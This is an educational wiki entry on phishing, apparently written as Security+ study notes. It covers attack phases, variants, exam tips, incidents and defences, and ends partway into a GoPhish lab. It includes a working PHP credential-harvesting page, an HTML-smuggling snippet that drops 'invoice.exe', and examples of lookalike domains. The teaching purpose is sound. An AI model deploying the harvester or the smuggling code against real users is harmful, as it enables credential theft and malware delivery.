---
domain: "attack-techniques"
tags: [phishing, social-engineering, email-security, credential-theft, malware-delivery, threat-actor]
---
# Phishing

**Phishing** is a [[social engineering]] attack in which a threat actor impersonates a trusted entity to deceive victims into revealing sensitive information, credentials, or installing [[malware]]. The term is a deliberate misspelling of "fishing," reflecting the technique of baiting victims with convincing lures. Phishing operates across multiple channels including email, SMS ([[smishing]]), voice calls ([[vishing]]), and web-based deception, making it one of the most prevalent initial access vectors in modern [[cyber attacks]].

---

## Overview

Phishing is statistically the most common entry point for data breaches and ransomware infections worldwide. According to the Verizon Data Breach Investigations Report (DBIR), over 36% of breaches involve phishing as the primary vector. Its effectiveness stems from exploiting human psychology rather than technical vulnerabilities — attackers bypass hardened perimeter defenses by targeting the human element directly, manipulating emotions such as urgency, fear, curiosity, and authority.

The attack has evolved dramatically since its origins in the mid-1990s, when attackers targeted AOL users by impersonating AOL staff to steal passwords. Modern phishing campaigns leverage sophisticated infrastructure including typosquatted domains, SSL certificates (giving victims a false sense of security from the padlock icon), legitimate cloud hosting (Google Drive, OneDrive, AWS S3), and adversary-in-the-middle (AiTM) proxy frameworks that can bypass multi-factor authentication in real time.

Phishing exists on a spectrum of targeting precision. Bulk, untargeted campaigns cast the widest net at the lowest cost, while **spear phishing** targets specific individuals with personalized context harvested from open-source intelligence (OSINT). **Whaling** targets executives (C-suite, board members), and **business email compromise (BEC)** involves impersonating executives or vendors to authorize fraudulent wire transfers — causing billions in losses annually according to FBI IC3 reports.

Nation-state threat actors routinely weaponize phishing for espionage. Notable examples include APT28 (Fancy Bear) using spear phishing against political targets in the 2016 U.S. election interference campaign, and APT41 targeting healthcare organizations during the COVID-19 pandemic. Criminal groups like TA505 and Lazarus Group have deployed phishing as the first stage of ransomware and financial fraud operations worth hundreds of millions of dollars.

---

## How It Works

Phishing attacks follow a structured kill chain that can be decomposed into distinct technical and social phases.

### Phase 1: Reconnaissance

Attackers gather target information using OSINT tools before crafting the lure:

```bash
# theHarvester: enumerate email addresses and subdomains
theHarvester -d targetcompany.com -b google,linkedin,bing

# Hunter.io CLI equivalent (curl-based)
curl "https://api.hunter.io/v2/domain-search?domain=targetcompany.com&api_key=YOUR_KEY"

# LinkedIn enumeration via linkedin2username
python3 linkedin2username.py -u attacker@email.com -c "Target Company"
```

Collected data informs the pretext: job titles, ongoing projects, vendor relationships, and direct manager names dramatically increase lure believability.

### Phase 2: Infrastructure Setup

The attacker registers a convincing domain:

```
Legitimate:   microsoft.com
Typosquatted: micosoft.com | microsoft-login.com | rnicro5oft.com
Homograph:    mіcrosoft.com  (Cyrillic 'і' U+0456 substituted for Latin 'i')
Subdomain:    login.microsoft.com.evil-domain.net
```

SSL/TLS certificates are obtained for free via Let's Encrypt, giving phishing sites the padlock indicator. A PHP-based credential harvesting page is deployed:

```php
<?php
// Simplified credential capture (for lab/educational context only)
$log_file = 'captured.txt';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = htmlspecialchars($_POST['username'] ?? '');
    $password = htmlspecialchars($_POST['password'] ?? '');
    $ip       = $_SERVER['REMOTE_ADDR'];
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents($log_file, "$timestamp | $ip | $username | $password\n", FILE_APPEND);
    // Redirect to legitimate site to avoid suspicion
    header('Location: https://login.microsoftonline.com');
    exit;
}
?>
```

### Phase 3: AiTM Proxy Attack (MFA Bypass)

Modern phishing frameworks such as **Evilginx2** and **Modlishka** act as reverse proxies, relaying traffic between the victim and the legitimate site, capturing session cookies in real time:

```bash
# Evilginx2 conceptual configuration
# The phishlet proxies the real login.microsoftonline.com
# Victim enters real credentials → forwarded to Microsoft
# Session token captured → replayed by attacker
# Result: MFA bypassed because valid session cookie is stolen post-authentication
```

This technique renders traditional MFA (TOTP, push notifications) ineffective. Only **phishing-resistant MFA** (FIDO2/WebAuthn, hardware security keys) stops AiTM attacks.

### Phase 4: Email Delivery

Phishing emails are crafted to pass or abuse email authentication controls:

```
Email Authentication Mechanisms:
- SPF  (Sender Policy Framework)  – validates sending mail server IP
- DKIM (DomainKeys Identified Mail) – cryptographic signature on mail headers
- DMARC (Domain-based Message Auth, Reporting & Conformance) – policy enforcement

Attacker bypass methods:
- Register lookalike domain without SPF/DKIM/DMARC → passes checks by default
- Compromise a legitimate mail relay (SendGrid, Mailchimp) with reputation
- Exploit DMARC p=none policy (monitoring only, no enforcement)
- Use HTML obfuscation, zero-width characters, or image-only emails to evade text scanning
```

### Phase 5: Payload Delivery and Post-Exploitation

Phishing lures may deliver:

```
Credential Harvesting  → fake login portal (described above)
Malware Dropper        → .docm with malicious macro → downloads Cobalt Strike beacon
                         .lnk file → PowerShell stager
                         .html smuggling → JavaScript decodes and drops executable client-side
QR Code Phishing (Quishing) → QR encodes phishing URL → bypasses email URL scanners
```

HTML smuggling example concept:
```html
<script>
  // Base64 encoded payload assembled in browser memory, bypassing email gateway inspection
  const b64 = "TVqQAAMAAAAEAAAA...";
  const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
  const blob  = new Blob([bytes], {type: 'application/octet-stream'});
  const a     = document.createElement('a');
  a.href      = URL.createObjectURL(blob);
  a.download  = 'invoice.exe';
  a.click();
</script>
```

---

## Key Concepts

- **Spear Phishing**: A highly targeted phishing attack directed at a specific individual or organization, using personalized information (name, role, ongoing projects) to increase credibility. Used in over 65% of nation-state intrusions.

- **Business Email Compromise (BEC)**: A sophisticated scam where attackers impersonate executives or trusted vendors via email to authorize fraudulent wire transfers or gift card purchases. The FBI IC3 reported $2.9 billion in BEC losses in 2023 alone.

- **Adversary-in-the-Middle (AiTM)**: A phishing technique using reverse proxy frameworks (Evilginx2, Modlishka) that relay authentication traffic in real time, capturing session tokens and bypassing standard MFA mechanisms like TOTP and push notifications.

- **Smishing**: Phishing conducted via SMS text messages, often delivering shortened URLs to credential harvesting sites or prompting calls to fake support numbers. Particularly effective due to the high open rate of SMS (98%) versus email (~20%).

- **Vishing**: Voice-based phishing using phone calls. Attackers may spoof caller ID to appear as IRS, bank fraud departments, or IT helpdesks. Often combined with SMS pretext to build trust before the call.

- **Quishing**: QR code-based phishing. Malicious QR codes are embedded in emails, flyers, or fake parking meters, directing victims to phishing URLs that bypass traditional email URL scanning since the URL is encoded in an image.

- **Watering Hole Attack**: A related technique where attackers compromise a website frequently visited by the target population, infecting visitors passively — often used as a follow-up or complement to phishing campaigns.

- **Typosquatting / Homograph Attack**: Registering domains visually similar to legitimate ones using misspellings or Unicode lookalike characters (IDN homograph attack) to deceive victims examining URLs.

---

## Exam Relevance

**CompTIA Security+ SY0-701** tests phishing across multiple domains, primarily in **Domain 2.0 (Threats, Vulnerabilities, and Mitigations)** and **Domain 5.0 (Security Program Management and Oversight)**.

**High-frequency question patterns:**

- **Identify the attack type from a scenario**: If a scenario describes a targeted email to a CEO using their name, recent travel, and business context → answer is **whaling** or **spear phishing** (whaling is spear phishing targeting executives specifically).
- **Distinguish phishing variants**: Know that smishing = SMS, vishing = voice, whaling = executive target, pharming = DNS poisoning redirecting to fake sites (different mechanism from phishing).
- **Pharming vs. Phishing**: Pharming involves [[DNS poisoning]] or hosts file modification to redirect legitimate domain requests — no deceptive email required. This is a common gotcha on the exam.
- **BEC and invoice fraud**: Typically categorized under social engineering and phishing; recognize that BEC does not require malware.
- **Defense question**: The correct answer for phishing defense is usually a combination — **user training + email filtering + MFA** — not a single control.
- **Phishing-resistant MFA**: FIDO2/WebAuthn and PIV/CAC smart cards are phishing-resistant. TOTP/HOTP and push-based MFA are NOT phishing-resistant (AiTM bypasses them). This is tested in newer SY0-701 questions.
- **Indicators in email headers**: Exam may show an email header and ask you to identify spoofing. Look for mismatches between `From:`, `Reply-To:`, and `Return-Path:` fields.

**Gotchas:**
- A phishing email with a malicious attachment is BOTH a phishing attack AND a malware delivery vector — context determines the "best" answer.
- "Impersonation" in a scenario implies social engineering/phishing, but if it involves intercepting communications, consider [[man-in-the-middle]] instead.
- DMARC `p=none` does NOT block phishing — it only reports. `p=quarantine` and `p=reject` provide actual enforcement.

---

## Security Implications

### Vulnerabilities Exploited

Phishing primarily exploits human psychological vulnerabilities amplified by technical weaknesses:

- **Lack of email authentication enforcement**: Domains with missing or `p=none` DMARC policies allow impersonation. According to research, over 80% of Fortune 500 companies had inadequate DMARC enforcement as recently as 2022.
- **Overreliance on non-phishing-resistant MFA**: Microsoft observed AiTM phishing campaigns stealing over 10,000 session tokens in a single campaign (reported July 2022, tracked as Storm-1167).
- **HTML smuggling bypassing SEGs**: Attackers assemble payloads in the browser using JavaScript, bypassing Secure Email Gateways that inspect attachments at the SMTP layer.

### Notable Incidents

- **2016 DNC/Podesta Hack (APT28)**: A spear phishing email with a fake Google password reset link was sent to John Podesta. A staff member mistakenly validated the link as "legitimate" rather than "illegitimate." Credential theft led to the publication of 50,000 emails via WikiLeaks.
- **2020 Twitter Bitcoin Scam**: Attackers used vishing to social engineer Twitter employees into providing VPN credentials, gaining access to admin tools and compromising 130 high-profile accounts including Obama, Biden, and Musk. Resulted in $120,000 in Bitcoin fraud.
- **2021 Colonial Pipeline Ransomware**: DarkSide gained initial access via a compromised VPN credential, likely obtained through phishing. The attack caused fuel shortages across the U.S. East Coast.
- **Microsoft AiTM Campaign (CVE-adjacent, 2022)**: No specific CVE, but Microsoft Threat Intelligence documented a large-scale AiTM phishing campaign bypassing MFA on Microsoft 365 accounts using Evilginx-style infrastructure at scale.

---

## Defensive Measures

### Email Authentication (Critical Baseline)

```dns
; SPF record - authorize only your mail servers
targetcompany.com. IN TXT "v=spf1 include:_spf.google.com ~all"

; DMARC record - enforce rejection of unauthorized mail
_dmarc.targetcompany.com. IN TXT "v=DMARC1; p=reject; rua=mailto:dmarc-reports@targetcompany.com; pct=100"

; DKIM - configured in your email provider (Google Workspace, M365)
; Check with: dig +short TXT google._domainkey.targetcompany.com
```

**Steps:**
1. Start DMARC at `p=none` to collect reports.
2. Analyze legitimate mail streams with tools like **dmarcian** or **Postmark DMARC**.
3. Progress to `p=quarantine`, then `p=reject` once legitimate sources are fully authorized.

### Technical Controls

| Control | Tool/Technology | Effectiveness |
|---|---|---|
| Secure Email Gateway (SEG) | Proofpoint, Mimecast, Microsoft Defender for O365 | High for known threats |
| Anti-phishing browser extension | Netcraft, Microsoft Defender SmartScreen | Medium |
| Phishing-resistant MFA | YubiKey (FIDO2), Windows Hello for Business | Very High (blocks AiTM) |
| DNS filtering | Cisco Umbrella, Pi-hole + blocklists, Cloudflare Gateway | Medium (blocks C2/phishing domains) |
| Conditional Access / Zero Trust | Azure AD Conditional Access, Okta | High (limits blast radius) |
| Email sandboxing | Detonation chambers in SEG, Cuckoo Sandbox | High for malware attachments |

### Organizational Controls

- **Phishing simulation programs**: Use **GoPhish** (open-source) or commercial platforms (KnowBe4, Proofpoint Security Awareness) to run regular simulated phishing campaigns. Track click rates, credential submission rates, and reporting rates.
- **Security Awareness Training**: NIST SP 800-50 recommends role-based training. High-risk users (finance, executives, IT admins) require more frequent training.
- **Incident Response Playbook**: Define a clear process for employees to report phishing (e.g., "Report Phishing" button in Outlook/Gmail) and for the SOC to investigate and remediate.
- **Privileged Account Isolation**: Ensure executive and admin accounts use phishing-resistant MFA and dedicated workstations to limit BEC impact.
- **DMARC Monitoring**: Subscribe to aggregate DMARC reports to identify unauthorized sending sources and spoofing attempts against your domain.

---

## Lab / Hands-On

### Lab 1: Deploy GoPhish Phishing Simulation Platform

```bash
# Download and run GoPhish on a local Kali/Ubuntu VM (never target external systems)
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish